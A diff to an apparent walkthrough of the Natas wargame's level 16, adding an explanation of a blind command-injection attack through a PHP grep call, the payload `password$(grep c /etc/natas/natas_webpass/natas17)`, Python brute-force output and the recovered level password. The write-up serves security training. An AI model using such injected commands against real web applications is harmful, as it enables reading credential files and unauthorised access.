@@ -759,7 +759,14 @@ These three characters can be used in Linux bash when you want to enforce an ord
 for the outer command, you follow the format: `outerCommand $(innerCommand)`. For example, if you have a file called 'abc' that has the line "hel" in it, you could write something like `echo $(cat abc)lo` to print "hello".
 
 Another key piece to this puzzle is the same line of code from [Level 9](#level-9) and [Level 10](#level-10), `passthru("grep -i \"$key\" dictionary.txt")`. Remember that it takes your input and uses `grep` to search for
-matching words in the dictionary.
+matching words in the dictionary. Inputting a proper word such as "password" would yield a couple of results, but say "passworda" would return nothing. We can take advantage of this logic by injecting code such as:
+
+`password$(grep c /etc/natas/natas_webpass/natas17)`
+
+where 'c' refers to some character. The inner command is clearly trying to find if character 'c' is present in the natas17 password file. At this point the condition should be very obvious; if the password contains the character
+'c', then the output of the whole command would be password + c and this would in turn lead to no results from the dictionary (no 'password' result). If the password does not contain the character 'c', then the inner command would
+return nothing and be left with 'password', which is a valid word and would be shown as one of the results from the dictionary. So bringing this all together, you can again write a Python script with the aforementioned condition
+to first find the password character set.
 
 ```python
 import requests
@@ -779,6 +786,16 @@ for c in charset:
         print(pwd_set)
 ```
 
+This results in the output:
+```
+b
+bh
+bhj
+...
+bhjkoqsvwCEFHJLNOT05789
+```
+
+The final step is identical to the previous [level](#level-16); brute force the password by going through the character set and check each time using the condition.
 
 ```python
 password = ''
@@ -791,6 +808,17 @@ while len(password) != 32:
             password += c
             print(password)
             break
+```
+
+> Note that the `^` operator in front of `grep` is a part of Regex. It matches the beginning of a line in the input. This is important because otherwise `grep` will return a match of a character 'c' even when it is in the middle of the password.
+
+Output:
+```
+E
+Eq
+Eqj
+...
+EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 ```
 
 Password: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
